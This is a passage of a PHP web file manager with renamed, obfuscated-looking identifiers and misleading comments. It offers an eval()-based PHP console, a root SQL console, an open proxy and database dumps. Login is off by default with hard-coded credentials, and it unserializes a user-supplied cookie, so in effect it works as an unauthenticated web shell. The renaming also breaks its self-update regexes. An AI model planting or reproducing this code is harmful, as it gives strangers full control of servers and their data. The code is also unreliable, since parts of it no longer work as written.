<?php


/* Shimuro Kageshi PHP File manager */



// Configuration so do not change manually!
$saulLegalToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
$legalTemplates = '{"Settings":"global $officeConfig;\r\nvar_export($officeConfig);","Backup SQL tables":"echo backupCartelTables();"}';



$kimSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
$omahaTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';


// end configuration


// Preparations
$startCaseTime = explode(' ', microtime());
$startCaseTime = $startCaseTime[1] + $startCaseTime[0];

$cliffLanguages = array('en','ru','de','fr','uk'); // file manager provides an intuitive interface for organizing digital files
$mcgillPath = empty($_REQUEST['path']) ? $mcgillPath = realpath('.') : realpath($_REQUEST['path']);

$mcgillPath = str_replace('\\', '/', $mcgillPath) . '/';
$mainOfficePath=str_replace('\\', '/',realpath('./'));
$maybeChuckPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;
$kimMessage = ''; // service string
$omahaDefaultLanguage = 'ru';
$detectOmahaLanguage = true;

$goodmanVersion = 1.4;






//Authorization
$howardVerified = json_decode($saulLegalToken,true);



$howardVerified['authorize'] = isset($howardVerified['authorize']) ? $howardVerified['authorize'] : 0; 
$howardVerified['days_authorization'] = (isset($howardVerified['days_authorization'])&&is_numeric($howardVerified['days_authorization'])) ? (int)$howardVerified['days_authorization'] : 30;

$howardVerified['login'] = isset($howardVerified['login']) ? $howardVerified['login'] : 'admin';  


$howardVerified['password'] = isset($howardVerified['password']) ? $howardVerified['password'] : 'phpfm';  



$howardVerified['cookie_name'] = isset($howardVerified['cookie_name']) ? $howardVerified['cookie_name'] : 'fm_user';
$howardVerified['script'] = isset($howardVerified['script']) ? $howardVerified['script'] : '';



// Drag and drop functionality makes moving files effortless
$defaultOfficeConfig = array (



	'make_directory' => true, 
	'new_file' => true, 
	'upload_file' => true, 


	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 

	'show_img' => true, 
	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini



	'show_gt' => true, // show generation time



	'enable_php_console' => true,
	'enable_sql_console' => true,
	'sql_server' => 'localhost',
	'sql_username' => 'root',

	'sql_password' => '',
	'sql_db' => 'test_base',

	'enable_proxy' => true,

	'show_phpinfo' => true,


	'show_xls' => true,
	'fm_settings' => true,



	'restore_time' => true,
	'fm_restore_time' => false,



);



if (empty($_COOKIE['fm_config'])) $officeConfig = $defaultOfficeConfig;



else $officeConfig = unserialize($_COOKIE['fm_config']);


// Change language
if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $howardVerified['days_authorization']));
	$_COOKIE['fm_lang'] = $_POST['fm_lang'];
}
$documentLanguage = $omahaDefaultLanguage;

// Detect browser language



if($detectOmahaLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$goodmanLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
	if (!empty($goodmanLanguagePriority)){



		foreach ($goodmanLanguagePriority as $cartelLanguages){
			$omahaLng = explode(';', $cartelLanguages);

			$omahaLng = $omahaLng[0];



			if(in_array($omahaLng,$cliffLanguages)){
				$documentLanguage = $omahaLng;
				break;
			}

		}
	}

} 


// Cookie language is primary for ever

$documentLanguage = (empty($_COOKIE['fm_lang'])) ? $documentLanguage : $_COOKIE['fm_lang'];




// Localization


$omahaLanguage = json_decode($omahaTranslation,true);



if ($omahaLanguage['id']!=$documentLanguage) {

	$getOfficeLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $documentLanguage . '.json');
	if (!empty($getOfficeLanguage)) {
		//remove unnecessary characters

		$omahaTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getOfficeLanguage),JSON_UNESCAPED_UNICODE));
		$goodmanFileContent = file_get_contents(__FILE__);

		$searchCase = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodmanFileContent, $caseMatches);



		if (!empty($caseMatches[1])) {
			$mesaFileModified = filemtime(__FILE__);

			$replaceHoward = str_replace('{"'.$caseMatches[1].'"}',$omahaTranslationString,$goodmanFileContent);

			if (file_put_contents(__FILE__, $replaceHoward)) {

				$kimMessage .= __('File updated');
			}	else $kimMessage .= __('Error occurred');
			if (!empty($officeConfig['fm_restore_time'])) touch(__FILE__,$mesaFileModified);
		}	
		$omahaLanguage = json_decode($omahaTranslationString,true);
	}
}




/* Functions */

//translation
function __($goodmanText){
	global $omahaLanguage;



	if (isset($omahaLanguage[$goodmanText])) return $omahaLanguage[$goodmanText];



	else return $goodmanText;
};





//delete files and dirs recursively



function deleteLaloFiles($mcgillFile, $howardIsRecursive = false) {


	if($howardIsRecursive && @is_dir($mcgillFile)) {
		$solElementList = scanGoodmanDirectory($mcgillFile, '', '', true);



		foreach ($solElementList as $legalElement) {
			if($legalElement != '.' && $legalElement != '..'){



				deleteLaloFiles($mcgillFile . '/' . $legalElement, true);
			}

		}



	}
	if(@is_dir($mcgillFile)) {



		return rmdir($mcgillFile);

	} else {


		return @unlink($mcgillFile);
	}
}

//file perms

function permissionsCartelString($mcgillFile, $ifGoodman = false){


	$cinnabonPermissions = fileperms($mcgillFile);
	$cliffInfo = '';
	if(!$ifGoodman){
		if (($cinnabonPermissions & 0xC000) == 0xC000) {
			//Socket



			$cliffInfo = 's';
		} elseif (($cinnabonPermissions & 0xA000) == 0xA000) {


			//Symbolic Link



			$cliffInfo = 'l';
		} elseif (($cinnabonPermissions & 0x8000) == 0x8000) {



			//Regular
			$cliffInfo = '-';
		} elseif (($cinnabonPermissions & 0x6000) == 0x6000) {



			//Block special



			$cliffInfo = 'b';
		} elseif (($cinnabonPermissions & 0x4000) == 0x4000) {


			//Directory



			$cliffInfo = 'd';


		} elseif (($cinnabonPermissions & 0x2000) == 0x2000) {


			//Character special


			$cliffInfo = 'c';
		} elseif (($cinnabonPermissions & 0x1000) == 0x1000) {
			//FIFO pipe



			$cliffInfo = 'p';


		} else {


			//Unknown



			$cliffInfo = 'u';


		}



	}
  
	//Owner
	$cliffInfo .= (($cinnabonPermissions & 0x0100) ? 'r' : '-');
	$cliffInfo .= (($cinnabonPermissions & 0x0080) ? 'w' : '-');


	$cliffInfo .= (($cinnabonPermissions & 0x0040) ?
	(($cinnabonPermissions & 0x0800) ? 's' : 'x' ) :
	(($cinnabonPermissions & 0x0800) ? 'S' : '-'));



 
	//Group
	$cliffInfo .= (($cinnabonPermissions & 0x0020) ? 'r' : '-');
	$cliffInfo .= (($cinnabonPermissions & 0x0010) ? 'w' : '-');



	$cliffInfo .= (($cinnabonPermissions & 0x0008) ?



	(($cinnabonPermissions & 0x0400) ? 's' : 'x' ) :
	(($cinnabonPermissions & 0x0400) ? 'S' : '-'));

 
	//World
	$cliffInfo .= (($cinnabonPermissions & 0x0004) ? 'r' : '-');



	$cliffInfo .= (($cinnabonPermissions & 0x0002) ? 'w' : '-');
	$cliffInfo .= (($cinnabonPermissions & 0x0001) ?
	(($cinnabonPermissions & 0x0200) ? 't' : 'x' ) :



	(($cinnabonPermissions & 0x0200) ? 'T' : '-'));




	return $cliffInfo;
}



function convertCartelPermissions($caseMode) {
	$caseMode = str_pad($caseMode,9,'-');


	$goodmanTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');
	$caseMode = strtr($caseMode,$goodmanTranslation);
	$newKimMode = '0';



	$goodmanOwner = (int) $caseMode[0] + (int) $caseMode[1] + (int) $caseMode[2]; 


	$cartelGroup = (int) $caseMode[3] + (int) $caseMode[4] + (int) $caseMode[5]; 
	$omahaGlobal = (int) $caseMode[6] + (int) $caseMode[7] + (int) $caseMode[8]; 

	$newKimMode .= $goodmanOwner . $cartelGroup . $omahaGlobal;
	return intval($newKimMode, 8);



}






function kimChangePermissions($mcgillFile, $kimValue, $caseRecord = false) {
	$goodmanResult = @chmod(realpath($mcgillFile), $kimValue);

	if(@is_dir($mcgillFile) && $caseRecord){



		$solElementList = scanGoodmanDirectory($mcgillFile);
		foreach ($solElementList as $legalElement) {
			$goodmanResult = $goodmanResult && kimChangePermissions($mcgillFile . '/' . $legalElement, $kimValue, true);
		}
	}
	return $goodmanResult;

}

//load files


function downloadGoodmanFile($mcgillFileName) {

    if (!empty($mcgillFileName)) {

		if (file_exists($mcgillFileName)) {



			header("Content-Disposition: attachment; filename=" . basename($mcgillFileName));   

			header("Content-Type: application/force-download");


			header("Content-Type: application/octet-stream");


			header("Content-Type: application/download");

			header("Content-Description: File Transfer");            

			header("Content-Length: " . filesize($mcgillFileName));		
			flush(); // this doesn't really matter.
			$mcgillPointer = fopen($mcgillFileName, "r");

			while (!feof($mcgillPointer)) {
				echo fread($mcgillPointer, 65536);
				flush(); // this is essential for large downloads
			} 
			fclose($mcgillPointer);


			die();
		} else {

			header('HTTP/1.0 404 Not Found', true, 404);

			header('Status: 404 Not Found'); 
			die();


        }
    } 
}



//show folder size
function calculateOfficeDirectorySize($francescaFile,$goodmanFormat=true) {



	if($goodmanFormat)  {
		$fileBatchSize=calculateOfficeDirectorySize($francescaFile,false);


		if($fileBatchSize<=1024) return $fileBatchSize.' bytes';
		elseif($fileBatchSize<=1024*1024) return round($fileBatchSize/(1024),2).'&nbsp;Kb';
		elseif($fileBatchSize<=1024*1024*1024) return round($fileBatchSize/(1024*1024),2).'&nbsp;Mb';



		elseif($fileBatchSize<=1024*1024*1024*1024) return round($fileBatchSize/(1024*1024*1024),2).'&nbsp;Gb';
		elseif($fileBatchSize<=1024*1024*1024*1024*1024) return round($fileBatchSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($fileBatchSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)

	} else {
		if(is_file($francescaFile)) return filesize($francescaFile);



		$fileBatchSize=0;


		$cliffDirHandle=opendir($francescaFile);

		while(($mcgillFile=readdir($cliffDirHandle))!==false) {
			if($mcgillFile=='.' || $mcgillFile=='..') continue;
			if(is_file($francescaFile.'/'.$mcgillFile)) $fileBatchSize+=filesize($francescaFile.'/'.$mcgillFile);
			else $fileBatchSize+=calculateOfficeDirectorySize($francescaFile.'/'.$mcgillFile,false);



		}
		closedir($cliffDirHandle);
		return $fileBatchSize+filesize($francescaFile); 
	}
}



//scan directory

function scanGoodmanDirectory($documentDirectoryPath, $explosiveExport = '', $caseType = 'all', $noHalfMeasuresFilter = false) {


	$saulDirectory = $numCartelDirs = array();


	if(!empty($explosiveExport)){
		$explosiveExport = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $explosiveExport)) . '$/';

	}
	if(!empty($caseType) && $caseType !== 'all'){
		$officeFunction = 'is_' . $caseType;
	}
	if(@is_dir($documentDirectoryPath)){

		$hectorFileHandle = opendir($documentDirectoryPath);
		while (false !== ($nachoFilename = readdir($hectorFileHandle))) {



			if(substr($nachoFilename, 0, 1) != '.' || $noHalfMeasuresFilter) {


				if((empty($caseType) || $caseType == 'all' || $officeFunction($documentDirectoryPath . '/' . $nachoFilename)) && (empty($explosiveExport) || preg_match($explosiveExport, $nachoFilename))){
					$saulDirectory[] = $nachoFilename;



				}
			}
		}
		closedir($hectorFileHandle);
		natsort($saulDirectory);
	}


	return $saulDirectory;


}




function mainGoodmanLink($getLegal,$goodmanLink,$goodmanName,$caseTitle='') {



	if (empty($caseTitle)) $caseTitle=$goodmanName.' '.basename($goodmanLink);


	return '&nbsp;&nbsp;<a href="?'.$getLegal.'='.base64_encode($goodmanLink).'" title="'.$caseTitle.'">'.$goodmanName.'</a>';



}


function goodmanArrayToOptions($kettlemanArray,$francescaN,$selectedDocument=''){
	foreach($kettlemanArray as $goodmanV){
		$cinnabonByte=$goodmanV[$francescaN];
		$goodmanResult.='<option value="'.$cinnabonByte.'" '.($selectedDocument && $selectedDocument==$cinnabonByte?'selected':'').'>'.$cinnabonByte.'</option>';
	}



	return $goodmanResult;

}


function documentLanguageForm ($currentCase='en'){



return '
<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >

		<option value="en" '.($currentCase=='en'?'selected="selected" ':'').'>'.__('English').'</option>

		<option value="de" '.($currentCase=='de'?'selected="selected" ':'').'>'.__('German').'</option>
		<option value="ru" '.($currentCase=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>

		<option value="fr" '.($currentCase=='fr'?'selected="selected" ':'').'>'.__('French').'</option>


		<option value="uk" '.($currentCase=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>


</form>



';
}

	

function cinnabonRootDirectory($mcgillDirectoryName){



	return ($mcgillDirectoryName=='.' OR $mcgillDirectoryName=='..');

}


function legalLabPanel($goodmanString){
	$showGoodmanMistakes=ini_get('display_errors');



	ini_set('display_errors', '1');


	ob_start();


	eval(trim($goodmanString));


	$goodmanText = ob_get_contents();
	ob_end_clean();
	ini_set('display_errors', $showGoodmanMistakes);
	return $goodmanText;


}

//SHOW DATABASES
function connectToCartelSql(){



	global $officeConfig;
	return new mysqli($officeConfig['sql_server'], $officeConfig['sql_username'], $officeConfig['sql_password'], $officeConfig['sql_db']);



}

function executeKimSql($goodmanQuery){
	global $officeConfig;

	$goodmanQuery=trim($goodmanQuery);



	ob_start();
	$cartelConnection = connectToCartelSql();
	if ($cartelConnection->connect_error) {


		ob_end_clean();	


		return $cartelConnection->connect_error;
	}



	$cartelConnection->set_charset('utf8');
    $queriedNacho = mysqli_query($cartelConnection,$goodmanQuery);


	if ($queriedNacho===false) {

		ob_end_clean();	



		return mysqli_error($cartelConnection);
    } else {
		if(!empty($queriedNacho)){


			while($kimRow = mysqli_fetch_assoc($queriedNacho)) {
				$cartelQueryResult[]=  $kimRow;
			}
		}



		$goodmanDump=empty($cartelQueryResult)?'':var_export($cartelQueryResult,true);	

		ob_end_clean();	


		$cartelConnection->close();
		return '<pre>'.stripslashes($goodmanDump).'</pre>';
	}
}




function backupCartelTables($cartelTables = '*', $fullCaseBackup = true) {



	global $mcgillPath;

	$huellDatabase = connectToCartelSql();
	$fileDelimiter = "; \n  \n";


	if($cartelTables == '*')	{


		$cartelTables = array();
		$caseResult = $huellDatabase->query('SHOW TABLES');
		while($kimRow = mysqli_fetch_row($caseResult))	{



			$cartelTables[] = $kimRow[0];



		}
	} else {

		$cartelTables = is_array($cartelTables) ? $cartelTables : explode(',',$cartelTables);



	}
    



	$returnToOffice='';
	foreach($cartelTables as $officeTable)	{


		$caseResult = $huellDatabase->query('SELECT * FROM '.$officeTable);


		$officeFieldCount = mysqli_num_fields($caseResult);



		$returnToOffice.= 'DROP TABLE IF EXISTS `'.$officeTable.'`'.$fileDelimiter;
		$solRowAlt = mysqli_fetch_row($huellDatabase->query('SHOW CREATE TABLE '.$officeTable));

		$returnToOffice.=$solRowAlt[1].$fileDelimiter;
        if ($fullCaseBackup) {
		for ($huellI = 0; $huellI < $officeFieldCount; $huellI++)  {
			while($kimRow = mysqli_fetch_row($caseResult)) {


				$returnToOffice.= 'INSERT INTO `'.$officeTable.'` VALUES(';
				for($jimmyJ=0; $jimmyJ<$officeFieldCount; $jimmyJ++)	{


					$kimRow[$jimmyJ] = addslashes($kimRow[$jimmyJ]);
					$kimRow[$jimmyJ] = str_replace("\n","\\n",$kimRow[$jimmyJ]);
					if (isset($kimRow[$jimmyJ])) { $returnToOffice.= '"'.$kimRow[$jimmyJ].'"' ; } else { $returnToOffice.= '""'; }
					if ($jimmyJ<($officeFieldCount-1)) { $returnToOffice.= ','; }
				}
				$returnToOffice.= ')'.$fileDelimiter;



			}


		  }


		} else { 



		$returnToOffice = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToOffice);



		}
		$returnToOffice.="\n\n\n";
	}



	//save file
    $mcgillFile=gmdate("Y-m-d_H-i-s",time()).'.sql';

	$saulHandle = fopen($mcgillFile,'w+');
	fwrite($saulHandle,$returnToOffice);
	fclose($saulHandle);


	$salamancaWarning = 'onClick="if(confirm(\''. __('File selected').': \n'. $mcgillFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $mcgillFile . '&path=' . $mcgillPath  . '\'"';

    return $mcgillFile.': '.mainGoodmanLink('download',$mcgillPath.$mcgillFile,__('Download'),__('Download').' '.$mcgillFile).' <a href="#" title="' . __('Delete') . ' '. $mcgillFile . '" ' . $salamancaWarning . '>' . __('Delete') . '</a>';



}





function restoreCartelTables($sqlToPractice) {


	$huellDatabase = connectToCartelSql();
	$fileDelimiter = "; \n  \n";
    // Load and explode the sql file
    $francescaFile = fopen($sqlToPractice,"r+");
    $sqlSaulFile = fread($francescaFile,filesize($sqlToPractice));
    $sqlKimArray = explode($fileDelimiter,$sqlSaulFile);

	
    //Process the sql file by statements
    foreach ($sqlKimArray as $goodmanStatement) {


        if (strlen($goodmanStatement)>3){


			$caseResult = $huellDatabase->query($goodmanStatement);
				if (!$caseResult){

					$sqlGoodmanErrorCode = mysqli_errno($huellDatabase->connection);



					$sqlGoodmanErrorText = mysqli_error($huellDatabase->connection);
					$goodmanSqlStatement      = $goodmanStatement;
					break;

           	     }


           	  }
           }


if (empty($sqlGoodmanErrorCode)) return __('Success').' â€” '.$sqlToPractice;
else return $sqlGoodmanErrorText.'<br/>'.$goodmanStatement;

}






function goodmanImageUrl($nachoFilename){
	return './'.basename(__FILE__).'?img='.base64_encode($nachoFilename);

}






function saulHomeStyle(){
	return '



input, input.fm_input {


	text-indent: 2px;
}


input, textarea, select, input.fm_input {



	color: black;
	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
	border-color: black;
	background-color: #FCFCFC none !important;



	border-radius: 0;


	padding: 2px;
}




input.fm_input {
	background: #FCFCFC none !important;

	cursor: pointer;


}



.home {


	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");


	background-repeat: no-repeat;
}';



}




function officeConfigCheckboxRow($goodmanName,$goodmanValue) {



	global $officeConfig;


	return '<tr><td class="row1"><input id="fm_config_'.$goodmanValue.'" name="fm_config['.$goodmanValue.']" value="1" '.(empty($officeConfig[$goodmanValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$goodmanValue.'">'.$goodmanName.'</td></tr>';
}

function officeProtocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';
	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';



	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
	return 'http://';
}




function goodmanSiteUrl() {


	return officeProtocol().$_SERVER['HTTP_HOST'];

}




function getOfficeUrl($fullMeasure=false) {
	$omahaHost=$fullMeasure?goodmanSiteUrl():'.';
	return $omahaHost.'/'.basename(__FILE__);
}

function goodmanHome($fullMeasure=false){

	return '&nbsp;<a href="'.getOfficeUrl($fullMeasure).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
}





function runOfficeInput($omahaLng) {
	global $officeConfig;
	$returnToOffice = !empty($officeConfig['enable_'.$omahaLng.'_console']) ? 



	'


				<form  method="post" action="'.getOfficeUrl().'" style="display:inline">
				<input type="submit" name="'.$omahaLng.'run" value="'.strtoupper($omahaLng).' '.__('Console').'">
				</form>
' : '';



	return $returnToOffice;
}




function officeUrlProxy($caseMatches) {
	$goodmanLink = str_replace('&amp;','&',$caseMatches[2]);



	$officeUrl = isset($_GET['url'])?$_GET['url']:'';
	$parseGoodmanUrl = parse_url($officeUrl);
	$omahaHost = $parseGoodmanUrl['scheme'].'://'.$parseGoodmanUrl['host'].'/';



	if (substr($goodmanLink,0,2)=='//') {
		$goodmanLink = substr_replace($goodmanLink,officeProtocol(),0,2);
	} elseif (substr($goodmanLink,0,1)=='/') {



		$goodmanLink = substr_replace($goodmanLink,$omahaHost,0,1);	
	} elseif (substr($goodmanLink,0,2)=='./') {
		$goodmanLink = substr_replace($goodmanLink,$omahaHost,0,2);	

	} elseif (substr($goodmanLink,0,4)=='http') {

		//alles machen wunderschon


	} else {
		$goodmanLink = $omahaHost.$goodmanLink;


	} 
	if ($caseMatches[1]=='href' && !strripos($goodmanLink, 'css')) {



		$omahaBasePath = goodmanSiteUrl().'/'.basename(__FILE__);
		$mcgillQuery = $omahaBasePath.'?proxy=true&url=';


		$goodmanLink = $mcgillQuery.urlencode($goodmanLink);
	} elseif (strripos($goodmanLink, 'css')){


		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾


	}
	return $caseMatches[1].'="'.$goodmanLink.'"';



}


 

function officeTemplateForm($cartelLanguageTemplate) {
	global ${$cartelLanguageTemplate.'_templates'};
	$legalTemplateArray = json_decode(${$cartelLanguageTemplate.'_templates'},true);

	$legalString = '';
	foreach ($legalTemplateArray as $keyTemplateOmaha=>$officeViewTemplate) {

		$legalString .= '<tr><td class="row1"><input name="'.$cartelLanguageTemplate.'_name[]" value="'.$keyTemplateOmaha.'"></td><td class="row2 whole"><textarea name="'.$cartelLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$officeViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';
	}


return '



<table>


<tr><th colspan="2">'.strtoupper($cartelLanguageTemplate).' '.__('templates').' '.runOfficeInput($cartelLanguageTemplate).'</th></tr>
<form method="post" action="">
<input type="hidden" value="'.$cartelLanguageTemplate.'" name="tpl_edited">



<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
'.$legalString.'


<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getOfficeUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">
<input type="hidden" value="'.$cartelLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1"><input name="'.$cartelLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$cartelLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>


</table>
';
}


/* End Functions */




// authorization
if ($howardVerified['authorize']) {


	if (isset($_POST['login']) && isset($_POST['password'])){
		if (($_POST['login']==$howardVerified['login']) && ($_POST['password']==$howardVerified['password'])) {

			setcookie($howardVerified['cookie_name'], $howardVerified['login'].'|'.md5($howardVerified['password']), time() + (86400 * $howardVerified['days_authorization']));



			$_COOKIE[$howardVerified['cookie_name']]=$howardVerified['login'].'|'.md5($howardVerified['password']);
		}



	}



	if (!isset($_COOKIE[$howardVerified['cookie_name']]) OR ($_COOKIE[$howardVerified['cookie_name']]!=$howardVerified['login'].'|'.md5($howardVerified['password']))) {
		echo '



<!doctype html>



<html>



<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />



<title>'.__('File manager').'</title>


</head>



<body>
<form action="" method="post">
'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;


<input type="submit" value="'.__('Enter').'" class="fm_input">


</form>

'.documentLanguageForm($documentLanguage).'
</body>



</html>
';  
die();


	}
	if (isset($_POST['quit'])) {



		unset($_COOKIE[$howardVerified['cookie_name']]);
		setcookie($howardVerified['cookie_name'], '', time() - (86400 * $howardVerified['days_authorization']));

		header('Location: '.goodmanSiteUrl().$_SERVER['REQUEST_URI']);
	}
}



// Change config
if (isset($_GET['fm_settings'])) {


	if (isset($_GET['fm_config_delete'])) { 
		unset($_COOKIE['fm_config']);
		setcookie('fm_config', '', time() - (86400 * $howardVerified['days_authorization']));



		header('Location: '.getOfficeUrl().'?fm_settings=true');

		exit(0);



	}	elseif (isset($_POST['fm_config'])) { 



		$officeConfig = $_POST['fm_config'];

		setcookie('fm_config', serialize($officeConfig), time() + (86400 * $howardVerified['days_authorization']));
		$_COOKIE['fm_config'] = serialize($officeConfig);
		$kimMessage = __('Settings').' '.__('done');
	}	elseif (isset($_POST['fm_login'])) { 
		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];
		$loginToWexlerForm = json_encode($_POST['fm_login']);


		$goodmanFileContent = file_get_contents(__FILE__);



		$searchCase = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodmanFileContent, $caseMatches);



		if (!empty($caseMatches[1])) {

			$mesaFileModified = filemtime(__FILE__);
			$replaceHoward = str_replace('{"'.$caseMatches[1].'"}',$loginToWexlerForm,$goodmanFileContent);



			if (file_put_contents(__FILE__, $replaceHoward)) {

				$kimMessage .= __('File updated');

				if ($_POST['fm_login']['login'] != $howardVerified['login']) $kimMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];

				if ($_POST['fm_login']['password'] != $howardVerified['password']) $kimMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$howardVerified = $_POST['fm_login'];



			}
			else $kimMessage .= __('Error occurred');



